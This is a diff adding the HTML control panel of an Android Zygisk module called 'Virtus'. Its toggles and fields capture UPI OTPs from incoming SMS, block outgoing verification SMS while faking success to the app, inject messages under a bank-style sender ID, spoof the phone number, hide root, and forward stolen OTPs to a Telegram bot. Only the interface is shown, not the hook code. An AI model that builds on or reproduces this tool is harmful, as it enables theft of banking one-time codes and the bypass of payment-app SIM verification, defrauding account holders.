@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Virtus</title>
+  <link rel="stylesheet" href="app.css" />
+</head>
+<body>
+  <div class="shell" id="shell">
+    <header class="top">
+      <div class="brand">
+        <span class="mark">V</span>
+        <div>
+          <h1>virtus</h1>
+          <p class="sub">zygisk · local · no apk</p>
+        </div>
+      </div>
+      <button type="button" class="icon-btn" id="btnClose" aria-label="Close">×</button>
+    </header>
+
+    <div class="status" id="statusPill">
+      <span class="dot"></span>
+      <span id="statusText">module ready</span>
+    </div>
+
+    <nav class="tabs" id="tabs">
+      <button type="button" data-tab="sms" class="active">SMS</button>
+      <button type="button" data-tab="system">System</button>
+      <button type="button" data-tab="telegram">Telegram</button>
+    </nav>
+
+    <main class="panels">
+      <section class="panel active" id="panel-sms">
+        <div class="row">
+          <div class="label">
+            <strong>Incoming hook</strong>
+            <span>UPI OTP capture</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="hook_incoming_sms" /><i></i></label>
+        </div>
+        <div class="row">
+          <div class="label">
+            <strong>Outgoing hook</strong>
+            <span>Verify SMS intercept</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="hook_outgoing_sms" /><i></i></label>
+        </div>
+        <div class="row highlight">
+          <div class="label">
+            <strong>Fake success</strong>
+            <span>SMS block + app ko sent dikhe</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="intercept_fake_success" /><i></i></label>
+        </div>
+        <div class="row">
+          <div class="label">
+            <strong>Auto OTP</strong>
+            <span>Token extract</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="auto_extract_otp" /><i></i></label>
+        </div>
+        <label class="field">
+          <span>Sender ID</span>
+          <input type="text" data-key="inject_sender_id" placeholder="JK-AXISBK-S" autocomplete="off" />
+        </label>
+        <label class="field">
+          <span>Inject body (test)</span>
+          <input type="text" data-key="inject_message_body" placeholder="optional test msg" autocomplete="off" />
+        </label>
+      </section>
+
+      <section class="panel" id="panel-system">
+        <div class="row">
+          <div class="label">
+            <strong>Hide root</strong>
+            <span>Magisk / KSU hide</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="hide_root" /><i></i></label>
+        </div>
+        <div class="row">
+          <div class="label">
+            <strong>Phone spoof</strong>
+            <span>Fake number apps ko</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="enable_phone_spoof" /><i></i></label>
+        </div>
+        <label class="field">
+          <span>Fake number SIM1</span>
+          <input type="tel" data-key="mock_phone_sim1" placeholder="+919876543210" />
+        </label>
+        <div class="row">
+          <div class="label">
+            <strong>UPI verify hook</strong>
+            <span>Per-app timer</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="hook_upi_verification" /><i></i></label>
+        </div>
+      </section>
+
+      <section class="panel" id="panel-telegram">
+        <p class="hint">Optional — sab local config.json mein save. Net OFF pe bhi hooks chalenge.</p>
+        <label class="field">
+          <span>Bot token</span>
+          <input type="password" data-key="telegram_bot_token" placeholder="123456:ABC..." autocomplete="off" />
+        </label>
+        <label class="field">
+          <span>Chat ID</span>
+          <input type="text" data-key="telegram_chat_id" placeholder="-100..." autocomplete="off" />
+        </label>
+        <div class="row">
+          <div class="label">
+            <strong>Forward OTP</strong>
+            <span>Telegram pe bhejo</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="auto_forward_token" /><i></i></label>
+        </div>
+        <div class="row">
+          <div class="label">
+            <strong>Fake intercept msg</strong>
+            <span>Outgoing block pe alert</span>
+          </div>
+          <label class="toggle"><input type="checkbox" data-key="fake_intercept_telegram" /><i></i></label>
+        </div>
+      </section>
+    </main>
+
+    <footer class="foot">
+      <button type="button" class="btn ghost" id="btnReload">Reload</button>
+      <button type="button" class="btn primary" id="btnSave">Save local</button>
+    </footer>
+
+    <div class="toast" id="toast" hidden></div>
+  </div>
+  <script src="app.js"></script>
+</body>
+</html>
